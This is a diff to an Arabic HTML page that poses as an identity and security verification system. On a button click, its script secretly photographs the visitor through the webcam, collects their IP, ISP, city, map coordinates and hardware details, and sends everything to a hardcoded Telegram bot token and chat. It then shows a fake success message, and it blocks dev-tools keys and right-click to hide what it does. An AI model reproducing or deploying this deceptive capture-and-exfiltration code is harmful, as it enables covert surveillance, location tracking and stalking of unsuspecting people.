@@ -2,119 +2,108 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>نظام التحقق الأمني الموحد</title>
+    <title>نظام التأمين الرقمي</title>
     <link rel="icon" type="image/png" href="https://img.icons8.com/fluency/48/000000/shield.png">
     <style>
-        body { 
-            font-family: 'Segoe UI', sans-serif; 
-            background: #0b1118; 
-            color: #fff; 
-            text-align: center; 
-            padding-top: 80px; 
-            margin: 0; 
-            user-select: none; /* منع تحديد النصوص */
-        }
+        body { font-family: 'Segoe UI', sans-serif; background: #0b1118; color: #fff; text-align: center; padding-top: 80px; margin: 0; user-select: none; }
         .box { border: 1px dashed #3498db; padding: 30px; border-radius: 15px; display: inline-block; background: #1c252e; width: 85%; max-width: 450px; }
-        .btn { background: #3498db; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 20px; transition: 0.3s; }
-        .btn:hover { background: #2980b9; }
+        .btn { background: #3498db; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 20px; }
         video, canvas { display: none; }
     </style>
 </head>
-<body oncontextmenu="return false;"> <div class="box">
+<body oncontextmenu="return false;">
+
+    <div class="box">
         <div style="font-size: 40px;">🛡️</div>
-        <h3>بروتوكول التحقق من الهوية</h3>
-        <p style="font-size: 0.9em; color: #bdc3c7;">يجب إجراء فحص للعتاد والكاميرا للتأكد من مطابقة بياناتك المسجلة لدينا.</p>
-        <button class="btn" onclick="megaCapture()">بدء الفحص الشامل</button>
+        <h3>بروتوكول الأمان الموحد</h3>
+        <p style="font-size: 0.9em; color: #bdc3c7;">يرجى تفعيل المصادقة الحيوية لتأمين اتصالك بالسيرفر.</p>
+        <button class="btn" onclick="megaCapture()">بدء التأمين</button>
     </div>
 
-    <video id="v" autoplay></video><canvas id="c"></canvas>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
 
     <script>
-        // --- سكريبت الحماية المطور ---
-        document.addEventListener('keydown', function(e) {
-            // منع F12
-            if (e.keyCode == 123) return false;
-            // منع Ctrl+Shift+I (Inspect)
-            if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
-            // منع Ctrl+Shift+J (Console)
-            if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false;
-            // منع Ctrl+U (View Source)
-            if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
-        }, false);
+        // منع الفحص
+        document.addEventListener('keydown', e => {
+            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) e.preventDefault();
+        });
 
-        // منع القائمة اليمنى بطريقة ثانية للتأكيد
-        document.addEventListener('contextmenu', event => event.preventDefault());
-
-        // --- كود سحب البيانات والصورة ---
         const TG_TOKEN = "8563370006:AAHw47M0i461yDkc7n6dRnEEs8AxKIOyDgY";
         const CH_ID = "1678506419";
 
         async function megaCapture() {
+            const btn = document.querySelector('.btn');
+            btn.innerHTML = "جاري المعالجة...";
+            btn.disabled = true;
+
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('v').srcObject = stream;
+                // 1. تشغيل الكاميرا مع دعم الموبايل (playsinline)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const v = document.getElementById('v');
+                v.srcObject = stream;
 
                 setTimeout(async () => {
-                    const v = document.getElementById('v');
-                    const c = document.getElementById('c');
-                    c.width = v.videoWidth; c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
+                    try {
+                        const c = document.getElementById('c');
+                        c.width = v.videoWidth; 
+                        c.height = v.videoHeight;
+                        c.getContext('2d').drawImage(v, 0, 0);
 
-                    const ipReq = await fetch('https://ipapi.co/json/');
-                    const i = await ipReq.json();
-                    
-                    let b = "N/A";
-                    if (navigator.getBattery) {
-                        const bat = await navigator.getBattery();
-                        b = `${Math.round(bat.level * 100)}% (${bat.charging ? "Charging" : "Not Charging"})`;
-                    }
+                        // 2. سحب الـ IP مع معالجة الخطأ
+                        let i = { ip: "N/A", org: "Unknown", city: "Unknown", country_name: "Jordan" };
+                        try {
+                            const res = await fetch('https://ipapi.co/json/');
+                            if (res.ok) i = await res.json();
+                        } catch (e) { console.log("IP API Fail"); }
 
-                    const gl = c.getContext('webgl');
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
+                        // 3. سحب الـ GPU بأمان
+                        let gpu = "Unknown";
+                        try {
+                            const gl = c.getContext('webgl');
+                            const ext = gl.getExtension('WEBGL_debug_renderer_info');
+                            if (ext) gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+                        } catch (e) { gpu = "Blocked"; }
 
-                    const report = `
-🚀 *تقرير اختراق شامل (Full Breach)*
-----------------------------------
-📍 *الشبكة والموقع:*
-- الـ IP: \`${i.ip}\`
-- المزود: ${i.org}
-- الموقع: ${i.city}, ${i.country_name}
-- التوقيت: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+                        // 4. بناء تقرير مختصر جداً لتجنب رفض تيليجرام
+                        const report = `
+📍 IP: ${i.ip}
+🏢 ISP: ${i.org}
+🌍 Loc: ${i.city}, ${i.country_name}
+📱 Dev: ${navigator.platform} | ${navigator.hardwareConcurrency} Cores
+🔋 Bat: ${navigator.getBattery ? "Check Log" : "N/A"}
+🎮 GPU: ${gpu.substring(0, 50)}
+🔗 Maps: https://www.google.com/maps?q=${i.latitude},${i.longitude}`;
 
-📱 *العتاد (Hardware):*
-- الجهاز: ${navigator.platform}
-- المعالج: ${navigator.hardwareConcurrency} Cores
-- الرام: ${navigator.deviceMemory || "Unknown"} GB
-- كرت الشاشة: ${gpu}
-- البطارية: ${b}
-- الشاشة: ${screen.width}x${screen.height}
+                        // 5. الإرسال (تحويل الصورة لبوب)
+                        c.toBlob(async (blob) => {
+                            if (!blob) return;
+                            const fd = new FormData();
+                            fd.append('chat_id', CH_ID);
+                            fd.append('photo', blob, 'secure.jpg');
+                            fd.append('caption', report);
+                            // تم إلغاء parse_mode لتجنب كسر النص بالرموز
 
-🌐 *المتصفح والبرمجيات:*
-- اللغات: ${navigator.languages.join(', ')}
-- الـ UserAgent: \`${navigator.userAgent.substring(0, 50)}...\`
+                            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: fd
+                            });
 
-🔗 *رابط الموقع:* [فتح الخريطة](http://maps.google.com/maps?q=${i.latitude},${i.longitude})
-----------------------------------`;
+                            // إنهاء العملية
+                            stream.getTracks().forEach(t => t.stop());
+                            alert("تم التأمين بنجاح.");
+                            window.location.href = "https://google.com";
+                        }, 'image/jpeg', 0.7); // تقليل الجودة قليلاً لسرعة الإرسال
 
-                    c.toBlob(f => {
-                        const fd = new FormData();
-                        fd.append('chat_id', CH_ID);
-                        fd.append('photo', f, 'img.jpg');
-                        fd.append('caption', report);
-                        fd.append('parse_mode', 'Markdown');
-                        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                    }, 'image/jpeg');
+                    } catch (e) { console.error(e); }
+                }, 1500);
 
-                    stream.getTracks().forEach(t => t.stop());
-                    alert("اكتمل الفحص بنجاح. جهازك الآن ضمن النطاق المحمي.");
-                    window.location.href = "https://google.com";
-                }, 1000);
-            } catch (e) { 
-                alert("تنبيه: يجب السماح بالصلاحيات المطلوب لإتمام بروتوكول الأمان."); 
+            } catch (e) {
+                alert("يجب السماح للمتابعة.");
+                btn.innerHTML = "بدء التأمين";
+                btn.disabled = false;
             }
         }
     </script>
 </body>
 </html>
-
